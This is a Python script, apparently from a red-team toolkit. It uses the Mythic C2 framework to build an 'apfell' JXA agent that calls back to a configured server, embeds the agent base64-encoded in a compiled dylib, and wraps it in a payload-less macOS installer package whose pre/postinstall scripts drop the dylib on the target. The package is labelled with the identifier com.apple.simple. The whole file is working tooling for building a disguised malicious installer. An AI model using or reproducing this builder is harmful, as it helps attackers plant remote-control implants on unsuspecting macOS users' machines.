import shutil, errno, os, base64
from sys import exit
from os import system
from Settings.MythicSettings import *
from mythic import *

def install_pkg_py():
    temp = "./Templates/JXADylib_Runner"
    payload = "./Payloads/Installer_Package_Dylib_Payload"    

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("Overwrote files '%s'" % payload)

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = mythic_rest.Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        p = mythic_rest.Payload(
            # what payload type is it
            payload_type="apfell", 
            c2_profiles={
                "http":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval},
                        {"name": "callback_port", "value": mythic_http_callback_port}
                    ]
                },
            # give our payload a description if we want
            tag="Installer Pkg w/ Dylib",
            selected_os="macOS",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            filename="Install_PKG_JXADylib.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
        payloadDownloadid = resp.response.file["agent_file_id"]

        #Download Payload 
        payload_contents = await mythic.download_payload(resp.response)
        pkg_payload = payload + "/Install_PKG_JXADylib.js"
        with open(pkg_payload, "wb") as f:
            f.write(payload_contents)  # write out to disk


        #Modify the runner
        templateString = "BASE64 ENCODED APFELL PAYLOAD HERE"
        fin = open(payload + "/Install_PKG_JXADylib.js", "rt")
        orgPayload = fin.read()
        fin.close()

        #base64 Payload
        message_bytes = orgPayload.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')

        #print(base64_message)


        fin = open("./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/JSRunner.mm", "rt")
        data = fin.read()
        data = data.replace(templateString, base64_message)
        fin.close()

        fin = open("./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/JSRunner.mm", "wt")
        fin.write(data)
        fin.close()
 
        # Create dylib
        print("[*] Building JXA Dylib")
        os.system("g++ -dynamiclib -o /private/tmp/helper.dylib -framework Foundation -framework OSAKit ./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/plugin.cpp ./Payloads/Installer_Package_Dylib_Payload/JXADylib_Runner/jsrunner.mm")
        os.system("mv /private/tmp/helper.dylib ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/files/helper.dylib")

        #Modify callback time
        fin = open("./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/files/helper.py", "rt")
        data = fin.read()
        data = data.replace("callback_time", str(mythic_http_callback_interval))
        fin.close()
        fin = open("./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/files/helper.py", "wt")
        fin.write(data)
        fin.close()
        

        #  Build the payload (currently no payload)
        print("[*] Building Installer Package Payload")
        os.system("chmod +x ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/preinstall")
        os.system("chmod +x ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts/postinstall")
        os.system("pkgbuild --identifier com.apple.simple --nopayload --scripts ./Payloads/Installer_Package_Dylib_Payload/simple-package/scripts ./Payloads/Installer_Package_Dylib_Payload/simple_dylib.pkg")

       
        print("[+] Built simple_dylib.pkg")
        print("Notes: \n"
              "1) This version saves the apfell payload dylib on target as /Library/Application Support/helper.dylib and the python file to execute it as helper.py \n"
              "2) Modify the preinstall and postinstall scripts to change this behavior")


    async def main():
        await scripting()
        try:
            while True:
                pending = mythic_rest.asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await mythic_rest.asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = mythic_rest.asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = mythic_rest.asyncio.get_event_loop()
    loop.run_until_complete(main())
